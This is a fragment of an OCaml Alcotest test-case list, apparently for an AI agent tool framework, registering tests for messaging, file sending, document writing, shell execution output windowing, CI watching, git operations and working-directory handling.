    Alcotest.test_case "send_poll text fallback" `Quick
      test_send_poll_text_fallback;
    Alcotest.test_case "send_poll validation" `Quick test_send_poll_validation;
    Alcotest.test_case "rich_message to_fallback_text" `Quick
      test_rich_message_to_fallback_text;
    Alcotest.test_case "file_attachment fallback with URL" `Quick
      test_file_attachment_fallback_text_with_url;
    Alcotest.test_case "file_attachment fallback no URL" `Quick
      test_file_attachment_fallback_text_no_url;
    Alcotest.test_case "file_attachment fallback empty desc" `Quick
      test_file_attachment_fallback_text_empty_desc;
    Alcotest.test_case "send_file with inline content" `Quick
      test_send_file_with_content;
    Alcotest.test_case "send_file with workspace path" `Quick
      test_send_file_with_workspace_path;
    Alcotest.test_case "send_file validation neither path nor content" `Quick
      test_send_file_validation_neither;
    Alcotest.test_case "send_file validation both path and content" `Quick
      test_send_file_validation_both;
    Alcotest.test_case "send_file content requires filename" `Quick
      test_send_file_content_requires_filename;
    Alcotest.test_case "send_file no store_file" `Quick test_send_file_no_store;
    Alcotest.test_case "guess_content_type" `Quick test_guess_content_type;
    Alcotest.test_case "connector capabilities can_send_files" `Quick
      test_connector_capabilities_can_send_files;
    Alcotest.test_case "doc_write creates file" `Quick test_doc_write_creates;
    Alcotest.test_case "doc_write appends" `Quick test_doc_write_appends;
    Alcotest.test_case "doc_write rejects traversal" `Quick
      test_doc_write_rejects_traversal;
    Alcotest.test_case "doc_write known file note" `Quick
      test_doc_write_known_file;
    Alcotest.test_case "shell_exec saves full output when truncated" `Quick
      test_shell_exec_saves_full_output_when_truncated;
    Alcotest.test_case "shell_exec head and tail window output" `Quick
      test_shell_exec_head_and_tail_window_output;
    Alcotest.test_case "shell_exec window handles trailing newline" `Quick
      test_shell_exec_head_tail_window_handles_trailing_newline;
    Alcotest.test_case "shell_exec head or tail only window output" `Quick
      test_shell_exec_head_or_tail_only_window_output;
    Alcotest.test_case "shell_exec total lines with head or tail" `Quick
      test_shell_exec_total_lines_shown_with_head_or_tail;
    Alcotest.test_case "background_task_logs truncates large output" `Quick
      test_background_task_logs_truncates_large_output;
    Alcotest.test_case "background_task_logs truncates long line" `Quick
      test_background_task_logs_truncates_pathological_long_line;
    Alcotest.test_case "background_task_logs clamps excessive lines" `Quick
      test_background_task_logs_clamps_excessive_lines;
    Alcotest.test_case "shell_exec saves full output when windowed" `Quick
      test_shell_exec_saves_full_output_when_windowed;
    Alcotest.test_case "shell_exec validates head and tail" `Quick
      test_shell_exec_rejects_non_positive_head_or_tail;
    Alcotest.test_case "shell_exec interrupts running process" `Quick
      test_shell_exec_interrupts_running_process;
    Alcotest.test_case "shell_exec interrupt moves to background" `Quick
      test_shell_exec_interrupt_moves_to_background;
    Alcotest.test_case "shell_exec timeout kills descendants" `Quick
      test_shell_exec_timeout_kills_descendants;
    Alcotest.test_case "watch_ci_after_push injects failure follow-up" `Quick
      test_watch_ci_after_push_injects_failure_follow_up;
    Alcotest.test_case "inject_session_message_async preserves channel context"
      `Quick test_inject_session_message_async_preserves_channel_context;
    Alcotest.test_case "shell_exec starts CI watch asynchronously" `Quick
      test_shell_exec_starts_ci_watch_asynchronously_after_push;
    Alcotest.test_case "shell_exec cd-prefix push uses cd repo path" `Quick
      test_shell_exec_cd_prefix_push_uses_cd_repo_path;
    Alcotest.test_case "extract_cd_prefix parses cd path && cmd" `Quick
      test_extract_cd_prefix;
    Alcotest.test_case "shell_exec cd prefix optimization sets cwd" `Quick
      test_shell_exec_cd_prefix_optimization;
    Alcotest.test_case "shell_exec injects CLAWQ_SESSION_ID env" `Quick
      test_shell_exec_injects_session_id_env;
    Alcotest.test_case "git_operations relative repo_path rejected" `Quick
      test_git_operations_repo_path_relative_rejected;
    Alcotest.test_case "git_operations absolute repo_path used as cwd" `Quick
      test_git_operations_repo_path_absolute_used_as_cwd;
    Alcotest.test_case "change_working_dir basic" `Quick
      test_change_working_dir_basic;
    Alcotest.test_case "change_working_dir rejects unmatched pattern" `Quick
      test_change_working_dir_rejects_unmatched_pattern;
    Alcotest.test_case "change_working_dir allows matching pattern" `Quick
      test_change_working_dir_allows_matching_pattern;
    Alcotest.test_case "change_working_dir rejects non-existent" `Quick
      test_change_working_dir_rejects_nonexistent;
    Alcotest.test_case "change_working_dir rejects file" `Quick
      test_change_working_dir_rejects_file;
    Alcotest.test_case "change_working_dir wipe history" `Quick
      test_change_working_dir_wipe_history;
    Alcotest.test_case "file_read uses effective CWD" `Quick
      test_file_read_uses_effective_cwd;
    Alcotest.test_case "file_read on directory" `Quick
      test_file_read_on_directory;
    Alcotest.test_case "shell_exec uses effective CWD" `Quick
      test_shell_exec_uses_effective_cwd;
    Alcotest.test_case "list_dir uses effective CWD" `Quick
      test_list_dir_uses_effective_cwd;
    Alcotest.test_case "B604: every builtin tool has 'required' in schema"
      `Quick test_every_builtin_tool_has_required_field;
  ]
